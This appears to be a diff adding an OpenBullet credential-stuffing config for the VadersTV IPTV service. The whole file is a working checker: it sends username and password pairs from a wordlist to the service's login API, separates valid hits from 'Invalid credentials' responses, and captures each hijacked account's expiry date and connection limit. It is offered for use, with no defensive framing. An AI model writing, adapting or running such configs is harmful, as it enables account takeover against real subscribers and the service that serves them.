@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "VadersTv",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-21T16:37:49.3145773+02:00",
+  "AdditionalInfo": "",
+  "Author": "MisterNoOne FIXED BY SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "http://vapi.vaders.tv/vod/user?username=<USER>&password=<PASS>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: http://watch.vaders.tv/login" 
+  HEADER "Referer: http://watch.vaders.tv" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Username could not be found" 
+    KEY "Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY "\"member_id" 
+PARSE "<SOURCE>" JSON "exp_date" Recursive=FALSE -> VAR "date" "" "" 
+PARSE "<SOURCE>" JSON "max_connections" Recursive=FALSE -> CAP "max_connections" "" "" 
+FUNCTION UnixTimeToDate "<date>" -> VAR "ExpirationDate" 
+PARSE "<ExpirationDate>" LR "" "" Recursive=FALSE -> CAP "ExpiryDate" "" "" 
